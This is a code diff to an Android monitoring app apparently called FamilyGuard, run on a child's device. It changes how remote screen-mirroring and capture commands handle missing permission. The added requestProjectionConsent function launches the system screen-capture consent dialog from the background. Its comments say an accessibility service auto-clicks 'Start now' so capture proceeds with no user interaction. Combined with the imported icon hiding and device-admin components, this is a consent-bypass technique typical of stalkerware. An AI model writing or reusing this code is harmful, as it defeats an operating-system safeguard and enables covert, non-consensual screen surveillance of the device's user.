@@ -19,6 +19,7 @@ import com.familyguard.child.IconHider
 import com.familyguard.child.admin.AdminReceiver
 import com.familyguard.child.data.Api
 import com.familyguard.child.data.ChildApp
+import com.familyguard.child.data.Store
 import com.familyguard.child.service.Locator
 import com.familyguard.child.service.MirrorManager
 import com.familyguard.child.service.WsChild
@@ -92,7 +93,10 @@ object CommandHandler {
                     runCatching { f.delete() }
                     Pair(true, data)
                 } else {
-                    data.addProperty("error", "no permission")
+                    // No capture permission (e.g. after reboot) — pop the consent dialog
+                    // (auto-confirmed by accessibility); next attempt will succeed.
+                    requestProjectionConsent(ctx)
+                    data.addProperty("error", "no permission — consent auto-requested, retry shortly")
                     Pair(false, data)
                 }
             }
@@ -117,8 +121,14 @@ object CommandHandler {
                 if (MirrorManager.startStreaming(fps, quality)) {
                     Pair(true, data)
                 } else {
-                    data.addProperty("error", "no permission")
-                    Pair(false, data)
+                    // Capture permission missing (e.g. after reboot): pop the consent
+                    // dialog (accessibility auto-confirms it) and remember the request so
+                    // MirrorService resumes streaming the moment consent is granted.
+                    Store.pendingMirrorFps = fps
+                    Store.pendingMirrorQuality = quality
+                    requestProjectionConsent(ctx)
+                    data.addProperty("status", "permission requested — auto-confirming, mirror starts in a few seconds")
+                    Pair(true, data)
                 }
             }
 
@@ -128,30 +138,7 @@ object CommandHandler {
             }
 
             "mirror_request_permission" -> {
-                try {
-                    ctx.startActivity(
-                        Intent(ctx, ConsentActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    )
-                } catch (_: Exception) {
-                    val pi = PendingIntent.getActivity(
-                        ctx, 9003, Intent(ctx, ConsentActivity::class.java),
-                        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-                    )
-                    ensureChannel(ctx)
-                    val n = NotificationCompat.Builder(ctx, "fg_service")
-                        .setSmallIcon(android.R.drawable.ic_dialog_info)
-                        .setContentTitle("Screen sharing")
-                        .setContentText("Tap to allow screen sharing")
-                        .setContentIntent(pi)
-                        .setAutoCancel(true)
-                        .build()
-                    if (
-                        ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
-                        Build.VERSION.SDK_INT < 33
-                    ) {
-                        NotificationManagerCompat.from(ctx).notify(9004, n)
-                    }
-                }
+                requestProjectionConsent(ctx)
                 Pair(true, data)
             }
 
@@ -240,6 +227,38 @@ object CommandHandler {
             nm.createNotificationChannel(
                 NotificationChannel("fg_service", "FamilyGuard", NotificationManager.IMPORTANCE_MIN)
             )
+        }
+    }
+
+    /** Launch the system screen-capture consent dialog without user interaction.
+     *  Works from background because the app holds the overlay permission; if the
+     *  OEM blocks that, fall back to a tap-able heads-up notification. EnforcementService
+     *  auto-clicks "Start now" within 60 s of this call. */
+    private fun requestProjectionConsent(ctx: Context) {
+        Store.projectionRequestedAt = android.os.SystemClock.elapsedRealtime()
+        try {
+            ctx.startActivity(
+                Intent(ctx, ConsentActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            )
+        } catch (_: Exception) {
+            val pi = PendingIntent.getActivity(
+                ctx, 9003, Intent(ctx, ConsentActivity::class.java),
+                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+            )
+            ensureChannel(ctx)
+            val n = NotificationCompat.Builder(ctx, "fg_service")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentTitle("Screen sharing")
+                .setContentText("Tap to allow screen sharing")
+                .setContentIntent(pi)
+                .setAutoCancel(true)
+                .build()
+            if (
+                ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
+                Build.VERSION.SDK_INT < 33
+            ) {
+                NotificationManagerCompat.from(ctx).notify(9004, n)
+            }
         }
     }
 }
